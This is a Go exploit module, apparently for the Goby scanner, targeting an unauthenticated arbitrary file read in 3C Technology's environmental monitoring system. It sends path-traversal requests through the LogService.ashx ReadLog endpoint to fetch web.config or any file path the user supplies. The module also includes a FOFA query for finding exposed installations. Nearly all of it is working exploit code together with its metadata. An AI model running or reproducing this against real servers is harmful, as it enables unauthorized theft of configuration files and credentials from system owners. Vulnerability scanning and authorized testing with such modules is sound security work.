package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "3C Technology Environmental Monitoring System /ajax/sys/LogService.ashx File Read Vulnerability",
    "Description": "<p>3C environmental automatic monitoring and dynamic control system realizes \"three-simultaneous\" three-dimensional monitoring of the working parameters, operation status and monitoring data of automatic monitoring equipment, and makes use of the big data intelligent tracing and alarming engine to timely discover, judge, respond to and deal with abnormalities and falsifications in the automatic monitoring equipment, which greatly improves the data quality and supervisory efficiency of the automatic monitoring of pollutant sources. </p><p> The ReadLog function point of 3C Technology's automatic environmental monitoring system is not subject to access control restrictions, and there is an arbitrary file reading vulnerability. An unauthorized attacker can read any file on the server to obtain system privileges and sensitive information. </p>",
    "Product": "3C environmental monitoring system",
    "Homepage": "http://www.3ctech.com.cn/",
    "DisclosureDate": "2024-08-01",
    "PostTime": "2024-08-08",
    "Author": "zhangjingpei@baimaohui.net",
    "FofaQuery": "body=\"Easyui/themes/default/easyui.css\" && body=\"Ajax/ValidCodeImg.ashx\"",
    "GobyQuery": "body=\"Easyui/themes/default/easyui.css\" && body=\"Ajax/ValidCodeImg.ashx\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>please pay attention to themanufacturer's homepage update.</p><p>If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Windows",
            "type": "input",
            "value": "../web.config",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2024"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.3",
    "Translation": {
        "CN": {
            "Name": "3C科技环境自动监测监控系统 /ajax/sys/LogService.ashx 文件读取漏洞",
            "Product": "3C科技-环境自动监测监控系统",
            "Description": "<p>3C环境自动监测动态管控系统实现了对自动监测设备工作参数、运行状态和监测数据的“三同时”立体式监控，利用大数据智能寻踪报警引擎及时发现、判断、响应和处理自动监控设备中出现的异常、造假等情形，大大提升了污染源自动监测的数据质量和监管效率。&nbsp;&nbsp;&nbsp;&nbsp;</p><p>&nbsp;3C科技环境自动监测监控系统ReadLog读取报错日志功能点不受访问控制限制，存在任意文件读取漏洞。未经授权的攻击者可以读取服务器上的任意文件,从而获取系统权限和敏感信息。&nbsp;&nbsp;<br></p>",
            "Recommendation": "<p>请用户联系⼚商修复漏洞</p><p>如非必要，禁止公网访问该系统</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "3C Technology Environmental Monitoring System /ajax/sys/LogService.ashx File Read Vulnerability",
            "Product": "3C environmental monitoring system",
            "Description": "<p>3C environmental automatic monitoring and dynamic control system realizes \"three-simultaneous\" three-dimensional monitoring of the working parameters, operation status and monitoring data of automatic monitoring equipment, and makes use of the big data intelligent tracing and alarming engine to timely discover, judge, respond to and deal with abnormalities and falsifications in the automatic monitoring equipment, which greatly improves the data quality and supervisory efficiency of the automatic monitoring of pollutant sources.&nbsp;</p><p>&nbsp;The ReadLog function point of 3C Technology's automatic environmental monitoring system is not subject to access control restrictions, and there is an arbitrary file reading vulnerability. An unauthorized attacker can read any file on the server to obtain system privileges and sensitive information.&nbsp;<br></p>",
            "Recommendation": "<p>please pay attention to themanufacturer's homepage update.<br></p><p>If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9922"
}`

	sendInitialPayload_MVWZY097H := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		//发送get请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 20
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/ajax/sys/LogService.ashx?Method=ReadLog&FileName=" + fileUrl
		header := map[string]string{
			"Accept":           "text/plain, */*; q=0.01",
			"User-Agent":       "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
			"X-Requested-With": "XMLHttpRequest",
			"Referer":          "http://" + hostInfo.HostInfo + "/Sys/Log/FileLogList.aspx",
			"Accept-Encoding":  "gzip, deflate",
			"Accept-Language":  "zh-CN,zh;q=0.9",
			"Connection":       "close",
		}
		resp, err := setGetRequest(hostInfo, path, header)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),

		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 此处需要修改：设置成功后的vulurl

			vulURL := "/ajax/sys/LogService.ashx?Method=ReadLog&FileName==../web.config"

			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件

			defaultModeMap := map[string]string{
				"../web.config": "configuration",
			}

			// 函数继承

			uploadFileFunc := sendInitialPayload_MVWZY097H

			// 请注意：后续代码为模板代码，非特殊情况，无需更改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			for fileUrl, fileText := range defaultModeMap {

				resp, err := uploadFileFunc(u, fileUrl)

				if err != nil {

					continue

				}

				if strings.Contains(resp, fileText) {

					// 设置VULURL

					ss.VulURL = u.HostInfo + vulURL

					return true

				}

			}

			return false

		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			var fileUrl string

			var fileText string

			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件

			defaultModeMap := map[string][2]string{

				"web.config": {"../web.config", "configuration"},
			}

			// 此处需要修改：函数继承

			uploadFileFunc := sendInitialPayload_MVWZY097H

			// 请注意，后续代码为模板固化，正常情况下均无需修改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			if mode == "Customize" {

				fileUrl = goutils.B2S(ss.Params["Windows"])

			} else {

				if _, ok := defaultModeMap[mode]; ok {

					fileUrl = defaultModeMap[mode][0]

					fileText = defaultModeMap[mode][1]

				} else {

					expResult.Success = false

					return expResult

				}

			}

			// 获取返回结果url和返回请求头

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)

			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {

				expResult.Success = false

				return expResult

			}

			expResult.Success = true

			expResult.Output = resp

			return expResult

		},
	))

}
